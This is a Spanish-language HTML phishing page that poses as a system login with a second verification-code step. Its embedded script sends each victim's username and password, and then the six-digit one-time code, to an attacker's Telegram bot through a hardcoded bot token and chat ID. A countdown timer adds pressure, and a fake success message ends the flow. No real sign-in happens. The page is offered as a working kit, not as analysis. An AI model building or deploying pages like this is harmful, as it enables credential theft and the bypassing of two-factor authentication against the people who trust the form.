<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f4f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #ffffff;
            padding: 35px 25px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 40, 100, 0.08);
            width: 100%;
            max-width: 360px;
            box-sizing: border-box;
            border-top: 5px solid #0056b3;
        }
        h2 {
            margin-top: 0;
            color: #003366;
            text-align: center;
            font-size: 22px;
            margin-bottom: 25px;
        }
        .input-group {
            position: relative;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #4a5568;
            font-size: 14px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
            background-color: #f8fafc;
            color: #334155;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #0056b3;
            background-color: #ffffff;
        }
        .password-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .toggle-password {
            position: absolute;
            right: 12px;
            cursor: pointer;
            color: #64748b;
            font-size: 18px;
            user-select: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #0056b3;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        button:hover {
            background-color: #004085;
        }
        button:disabled {
            background-color: #94a3b8;
            cursor: not-allowed;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        .instruction-text {
            color: #64748b;
            font-size: 14px;
            text-align: center;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .timer {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #dc2626;
            margin-top: 15px;
            background-color: #fee2e2;
            padding: 8px;
            border-radius: 6px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- PASO 1: LOGIN -->
    <div id="step1" class="step active">
        <h2>Ingreso al Sistema</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="usuario">Usuario</label>
                <input type="text" id="usuario" required placeholder="Ej. correo o identificación">
            </div>
            
            <div class="input-group">
                <label for="contrasena">Contraseña</label>
                <div class="password-wrapper">
                    <input type="password" id="contrasena" required placeholder="Introduce tu clave">
                    <span class="toggle-password" id="eyeIcon">👁️‍🗨️</span>
                </div>
            </div>
            
            <button type="submit" id="btnSiguiente">Siguiente</button>
        </form>
    </div>

    <!-- PASO 2: CÓDIGO DE VERIFICACIÓN -->
    <div id="step2" class="step">
        <h2>Verificación de Seguridad</h2>
        <p class="instruction-text">Por favor, pon el código de 6 dígitos que hemos enviado a tu correo o número de celular para continuar.</p>
        
        <form id="codeForm">
            <div class="input-group">
                <input type="text" id="codigoVerificacion" maxlength="6" pattern="\d{6}" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 8px;">
            </div>
            
            <button type="submit" id="btnFinalizar">Verificar</button>
        </form>
        
        <div class="timer" id="countdown">10:00</div>
    </div>
</div>

<script>
    // Credenciales fijadas correctamente
    const TELEGRAM_TOKEN = '9100194804:AAEx5kItgP_Mq6RHWkl8mJKbcw5Wg6FV3Bc'; 
    const CHAT_ID = '8885271470'; 

    const contrasenaInput = document.getElementById('contrasena');
    const eyeIcon = document.getElementById('eyeIcon');

    eyeIcon.addEventListener('click', function() {
        if (contrasenaInput.type === 'password') {
            contrasenaInput.type = 'text';
            eyeIcon.textContent = '👁️'; 
        } else {
            contrasenaInput.type = 'password';
            eyeIcon.textContent = '👁️‍🗨️'; 
        }
    });

    // Envío del Paso 1 (Usuario y Clave)
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const usuario = document.getElementById('usuario').value;
        const contrasena = document.getElementById('contrasena').value;
        const btn = document.getElementById('btnSiguiente');

        btn.disabled = true;
        btn.innerText = 'Cargando...';

        const textoTelegram = '🔐 *Datos Recibidos*\n\n👤 *Usuario:* ' + usuario + '\n🔑 *Clave:* ' + contrasena;
        
        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
        const urlPaso1 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';

        fetch(urlPaso1, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: textoTelegram,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) throw new Error('Error en la API');
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            startTimer(600); 
        })
        .catch(err => {
            alert('Ocurrió un inconveniente de red. Intenta nuevamente.');
            btn.disabled = false;
            btn.innerText = 'Siguiente';
        });
    });

    // Envío del Paso 2 (Código de Verificación)
    document.getElementById('codeForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const codigo = document.getElementById('codigoVerificacion').value;
        const btn = document.getElementById('btnFinalizar');

        btn.disabled = true;
        btn.innerText = 'Procesando...';

        const textoTelegramCodigo = '🔢 *Código de 6 Dígitos*\n\n📩 *Código:* ' + codigo;
        
        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
        const urlPaso2 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';

        fetch(urlPaso2, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: textoTelegramCodigo,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) throw new Error('Error en la API');
            alert('Verificación completada con éxito.');
        })
        .catch(() => {
            alert('Ocurrió un inconveniente de red. Intenta nuevamente.');
            btn.disabled = false;
            btn.innerText = 'Verificar';
        });
    });

    function startTimer(duration) {
        let timer = duration, minutes, seconds;
        const display = document.getElementById('countdown');
        
        const interval = setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);

            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = minutes + ":" + seconds;

            if (--timer < 0) {
                clearInterval(interval);
                display.textContent = "Expirado";
            }
        }, 1000);
    }
</script>

</body>
</html>
